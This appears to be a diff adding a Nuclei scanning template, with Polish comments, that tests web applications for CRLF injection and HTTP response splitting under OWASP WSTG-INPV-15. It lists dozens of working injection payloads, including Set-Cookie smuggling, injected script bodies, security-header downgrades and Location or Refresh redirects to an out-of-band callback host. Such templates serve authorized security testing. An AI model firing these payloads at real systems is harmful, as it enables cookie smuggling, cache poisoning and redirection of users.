@@ -1,0 +1,236 @@
+# ============================================================================
+# WSTG-INPV-15: HTTP Response Splitting (CRLF Injection) (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (CRLF / HTTP Splitting). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ CRLF in Location header (open redirect via header injection)
+#   ✓ CRLF in Set-Cookie (cookie smuggling)
+#   ✓ CRLF in custom X-* headers
+#   ✓ Encoded variants (%0a%0d, %0A%0D, %u000a, etc.)
+#   ✓ Header smuggling for cache poisoning
+#
+# Performance budget: low-medium (~80 payloads)
+# Estimated time: ~5-10 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/CRLF Injection/*
+#   2. hacktricks/.../crlf-0d-0a.md
+# ============================================================================
+
+id: wstg-inpv-15-http-splitting
+
+info:
+  name: "WSTG-INPV-15: HTTP Response Splitting / CRLF Injection (Universal)"
+  author: pentest-team
+  severity: medium
+  description: |
+    Wykrywa CRLF injection w nagłówkach HTTP (Location, Set-Cookie, custom),
+    co umożliwia HTTP Response Splitting, cookie smuggling, cache poisoning.
+    Detekcja: wstrzyknięty nagłówek/cookie pojawia się w response, lub
+    wstrzyknięty body marker jest renderowany.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+  classification:
+    cwe-id: CWE-93,CWE-113
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+  tags: dast,wstg,wstg-v42-inpv-15,crlf,http-splitting,asvs-v5.2.7,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Header injection - Set-Cookie smuggling
+        # ====================================================================
+        - "test%0d%0aSet-Cookie:{{canary}}=injected"
+        - "test%0aSet-Cookie:{{canary}}=injected"
+        - "test\\r\\nSet-Cookie:{{canary}}=injected"
+        - "test%0D%0ASet-Cookie:%20{{canary}}=injected"
+        - "test%E5%98%8A%E5%98%8DSet-Cookie:%20{{canary}}=injected"     # UTF-8 overlong CRLF
+        - "%0d%0aSet-Cookie:{{canary}}=admin"
+        - "%23%0d%0aSet-Cookie:%20{{canary}}=injected"
+
+        # ====================================================================
+        # GROUP 2: Custom header injection (X-Header, Refresh, Link)
+        # ====================================================================
+        - "test%0d%0aX-Injected:{{canary}}"
+        - "test%0aX-Injected:{{canary}}"
+        - "test%0d%0aX-XSS-Test:{{canary}}"
+        - "test%0d%0aRefresh:0;url=http://{{interactsh-url}}/{{canary}}"
+        - "test%0d%0aLink:<http://{{interactsh-url}}>;rel=preload"
+        - "test%0d%0aContent-Length:0"
+
+        # ====================================================================
+        # GROUP 3: Full response splitting (body injection)
+        # ====================================================================
+        - "test%0d%0a%0d%0a<html>{{canary}}</html>"
+        - "test%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>{{canary}}</script>"
+        - "test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>{{canary}}</html>"
+
+        # ====================================================================
+        # GROUP 4: Encoded variants (URL, double-URL, unicode)
+        # ====================================================================
+        - "%250d%250aSet-Cookie:%20{{canary}}=injected"
+        - "%25250d%25250aSet-Cookie:{{canary}}=injected"
+        - "%u000d%u000aSet-Cookie:{{canary}}=injected"
+        - "%c4%8d%c4%8aSet-Cookie:{{canary}}=injected"            # IIS bypass
+        - "%0d%0a%20Set-Cookie:%20{{canary}}=injected"             # space-prefixed
+        # Just LF (sometimes accepted)
+        - "test%0aSet-Cookie:%20{{canary}}=injected"
+        # Just CR
+        - "test%0dSet-Cookie:%20{{canary}}=injected"
+
+        # ====================================================================
+        # GROUP 5: Location header poisoning (open redirect via CRLF)
+        # ====================================================================
+        - "/path%0d%0aLocation:http://{{interactsh-url}}/{{canary}}"
+        - "/?next=http://example.com/%0d%0aLocation:http://{{interactsh-url}}"
+        - "/?return=test%0d%0aLocation:http://{{interactsh-url}}"
+
+        # ====================================================================
+        # GROUP 6: Cache poisoning via Vary/Cache-Control injection
+        # ====================================================================
+        - "test%0d%0aCache-Control:no-cache"
+        - "test%0d%0aPragma:no-cache"
+        - "test%0d%0aVary:*"
+        - "test%0d%0aClear-Site-Data:\"cookies\""
+
+        # ====================================================================
+        # GROUP 7: HSTS / Security headers downgrade
+        # ====================================================================
+        - "test%0d%0aStrict-Transport-Security:max-age=0"
+        - "test%0d%0aContent-Security-Policy:default-src *"
+        - "test%0d%0aX-Frame-Options:ALLOWALL"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        # Targetowanie params pasujących do redirect/url/next/lang
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - canary jako Set-Cookie/X-Header w response
+      - type: regex
+        part: header
+        name: injected-header-present
+        regex:
+          - "(?i)Set-Cookie:[^\\r\\n]*{{canary}}"
+          - "(?i)X-Injected:[^\\r\\n]*{{canary}}"
+          - "(?i)X-XSS-Test:[^\\r\\n]*{{canary}}"
+          - "(?i)Refresh:[^\\r\\n]*{{canary}}"
+          - "(?i)Link:[^\\r\\n]*{{canary}}"
+          - "(?i)Location:[^\\r\\n]*{{canary}}"
+        condition: or
+
+      # Warstwa 2: ANTI-FP - canary nie pochodzi z normalnej reflection
+      # (status codes 30x z Location pasującym do request URL)
+      # Tu polegamy na warstwie 1 że canary jest UNIKALNY w odpowiedzi
+      - type: dsl
+        name: response-meaningful
+        dsl:
+          - "len(all_headers) > 30"
+
+      # Warstwa 3: ANTI-FP - WAF block
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: injected-header
+        part: header
+        regex:
+          - "(?i)(Set-Cookie|X-Injected|Location|Refresh|Link)[^\\r\\n]*{{canary}}"
+
+  # ==========================================================================
+  # DRUGI BLOCK: CRLF injection via redirect to OAST
+  # Wstrzyknięcie Location header z URL do interactsh - jeśli przeglądarka/
+  # automat (curl, robot) podąża za redirectem, callback potwierdza
+  # że Location został kontrolowany przez attackera.
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      crlf_oob:
+        # CRLF + Location to attacker URL
+        - "%0d%0aLocation:%20http://{{interactsh-url}}/{{canary}}"
+        - "%0aLocation:%20http://{{interactsh-url}}/{{canary}}"
+        - "%E5%98%8A%E5%98%8DLocation:%20http://{{interactsh-url}}/{{canary}}"
+        # Refresh header
+        - "%0d%0aRefresh:%200;%20url=http://{{interactsh-url}}/{{canary}}"
+        # Link header (preload)
+        - "%0d%0aLink:%20<http://{{interactsh-url}}/{{canary}}>;rel=preload"
+        # Server-Side Request via Set-Cookie + same-origin redirect
+        - "%0d%0aSet-Cookie:%20oob=http://{{interactsh-url}}/{{canary}}"
+
+    fuzzing:
+      - parts: [query, body, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{crlf_oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Nowoczesne frameworki (Express, Spring, Rails) blokują CRLF w headerach
+#   na poziomie biblioteki - real-world hit rate niski
+# - Web servery z safelist headerów filtrują "X-Injected" jako podejrzane
+# - HTTP/2 nie używa CRLF jako separator - tu fuzzujemy klasyczne HTTP/1.1
+# ============================================================================
